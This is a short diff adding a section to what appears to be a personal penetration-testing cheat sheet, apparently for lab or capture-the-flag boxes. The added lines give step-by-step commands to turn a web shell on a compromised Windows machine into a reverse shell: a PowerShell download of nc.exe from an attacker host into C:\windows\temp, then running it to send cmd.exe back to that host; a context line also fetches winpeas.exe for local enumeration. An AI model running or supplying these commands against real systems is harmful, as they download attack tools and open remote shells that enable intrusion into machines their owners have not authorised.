@@ -122,6 +122,11 @@ On attacker side:
 then from reversshell's console type: wget http://10.10.10.10/winpeas.exe  for local enumeration
 
 Any questions look for acute for ippsec.rocks.
+-------------------------------------------------------
+
+On compromised windows box we got a web shell. In order to get a reverse shell execute in webshell the commands below(on attacker side run local listner):
+powershell wget -Uri http://attacker_ip/nc.exe -OutFile C:\windows\temp\nc.exe
+C:\windows\temp\nc.exe -e cmd.exe attacker_ip 4446
 
 --------------------------------------------------------
 
